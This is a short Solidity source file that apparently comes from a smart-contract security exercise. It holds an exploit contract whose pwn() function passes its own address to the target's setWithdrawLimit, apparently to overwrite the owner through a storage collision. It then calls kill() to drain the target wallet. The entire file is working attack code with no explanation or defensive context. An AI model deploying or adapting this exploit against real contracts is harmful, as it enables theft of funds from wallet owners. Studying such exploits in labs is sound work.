// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IBurnerWallet {
     function setWithdrawLimit(uint _limit) external;
     function kill() external; 
}

contract BurnerWalletExploit {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function pwn() external {
        // set owner to this contract
        IBurnerWallet(target).setWithdrawLimit(uint(uint160(address(this))));
        // kill to drain
        IBurnerWallet(target).kill();
    }
}